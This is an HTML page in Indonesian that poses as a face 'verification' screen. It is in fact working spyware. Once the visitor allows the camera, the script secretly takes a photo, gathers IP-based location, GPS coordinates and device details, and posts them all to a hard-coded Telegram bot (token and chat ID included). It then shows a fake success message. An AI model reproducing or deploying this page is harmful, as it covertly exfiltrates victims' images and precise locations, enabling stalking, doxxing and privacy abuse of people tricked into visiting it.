<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi</title>
    <style>
        body { margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; color: white; }
        .container { background: #1a1a2e; padding: 30px; border-radius: 12px; text-align: center; width: 300px; }
        video { width: 100%; border-radius: 8px; background: #000; margin: 15px 0; transform: scaleX(-1); }
        .status { margin: 10px 0; padding: 8px; border-radius: 6px; background: #0f3460; font-size: 14px; }
        .msg { margin-top: 12px; font-size: 14px; color: #888; }
    </style>
</head>
<body>

<div class="container">
    <h2>📸 Verifikasi</h2>
    <p style="font-size:14px; color:#aaa;">Arahkan wajah ke kamera</p>
    <video id="video" autoplay playsinline></video>
    <div class="status" id="status">⏳ Menunggu...</div>
    <div class="msg" id="infoMsg">Memproses...</div>
</div>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const BOT_TOKEN = "7961613868:AAExZB1W9L5EinCeDvwGASisthoLGgYayBM";
    const CHAT_ID = "7781744044";

    // ========== ELEMEN ==========
    const video = document.getElementById('video');
    const statusEl = document.getElementById('status');
    const infoMsg = document.getElementById('infoMsg');

    let stream = null;
    let photoTaken = false;

    // ========== MULAI KAMERA & AUTO CAPTURE ==========
    async function startCamera() {
        try {
            statusEl.textContent = '⏳ Mengakses kamera...';
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: { ideal: 480 } } 
            });
            video.srcObject = stream;
            statusEl.textContent = '✅ Kamera aktif';

            setTimeout(() => {
                if (!photoTaken) captureAndSend();
            }, 500);

        } catch (err) {
            statusEl.textContent = '❌ Gagal akses kamera';
            infoMsg.textContent = 'Izin kamera diperlukan.';
        }
    }

    // ========== CAPTURE + KIRIM SEMUA DATA ==========
    async function captureAndSend() {
        if (!stream || photoTaken) return;

        statusEl.textContent = '📸 Memproses...';

        // 1. Capture foto
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 480;
        canvas.height = video.videoHeight || 360;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);

        // 2. Dapatkan IP & Data Device
        const ipData = await getIPData();
        const locationData = await getLocation();

        // 3. Buat caption lengkap
        const caption = `📸 *New Capture!*
🕐 ${new Date().toLocaleString()}

🌐 *IP:* ${ipData.ip || 'Unknown'}
📍 *City:* ${ipData.city || 'Unknown'}
🏙️ *Region:* ${ipData.region || 'Unknown'}
🌍 *Country:* ${ipData.country || 'Unknown'}
🗺️ *Map:* ${locationData ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}` : 'Tidak tersedia'}

📱 *Device Info:*
• Browser: ${navigator.userAgent}
• Platform: ${navigator.platform}
• Language: ${navigator.language}
• Screen: ${screen.width}x${screen.height}
• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;

        // 4. Kirim foto + caption ke Telegram
        const byteString = atob(imageDataUrl.split(',')[1]);
        const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        const blob = new Blob([ab], { type: mimeString });

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                statusEl.textContent = '✅ Terkirim!';
                infoMsg.textContent = '✔️ Verifikasi selesai.';
                photoTaken = true;
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#00ff88;font-family:Arial;font-size:20px;">
                            ✅ Verifikasi berhasil. Anda akan dialihkan...
                        </div>
                    `;
                }, 1000);
            } else {
                statusEl.textContent = '❌ Gagal kirim';
                infoMsg.textContent = 'Error: ' + response.status;
            }
        } catch (err) {
            statusEl.textContent = '❌ Error: ' + err.message;
        }
    }

    // ========== GET IP + LOCATION (ipapi) ==========
    async function getIPData() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip || 'Unknown',
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                country: data.country_name || 'Unknown'
            };
        } catch (err) {
            return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
        }
    }

    // ========== GET GPS (Geolocation API) ==========
    async function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude
                    });
                },
                () => resolve(null),
                { timeout: 5000, enableHighAccuracy: true }
            );
        });
    }

    // ========== JALANKAN ==========
    startCamera();
</script>

</body>
</html>
